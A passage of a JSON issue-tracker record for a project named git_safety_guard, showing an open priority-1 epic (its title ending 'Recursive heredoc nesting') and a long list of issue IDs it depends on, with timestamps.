Recursive heredoc nesting","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T18:28:08.502051689-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:28:08.502051689-05:00","dependencies":[{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:28:33.156627112-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:28:51.942182529-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:29:24.645603891-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:29:45.137126036-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:14.545375401-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:30:37.534882086-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:06.013753048-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:27.250568872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:31:58.344341425-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:32:32.951489053-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:34:20.619502644-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:35:11.238168575-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:35:40.032362893-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:37:03.035457423-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:37:34.31174363-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:37:35.469733942-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:37:37.404070403-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.216578116-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:39:24.548074304-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:16.23083852-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-4o8","type":"blocks","created_at":"2026-01-07T18:40:53.391076545-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.383677396-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.824701001-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-fpim","type":"blocks","created_at":"2026-01-07T19:28:33.995705031-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-hcfg","type":"blocks","created_at":"2026-01-07T19:28:34.164491315-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-perf","type":"blocks","created_at":"2026-01-07T19:28:34.326399906-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-e2eh","type":"blocks","created_at":"2026-01-07T19:28:34.496866284-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-tlog","type":"blocks","created_at":"2026-01-07T19:28:34.658765407-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-unit","type":"blocks","created_at":"2026-01-07T19:28:34.843179581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-erux","type":"blocks","created_at":"2026-01-07T19:31:01.81722121-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-rbst","type":"blocks","created_at":"2026-01-07T21:11:01.823812892-05:00","created_by":"ubuntu"}]}
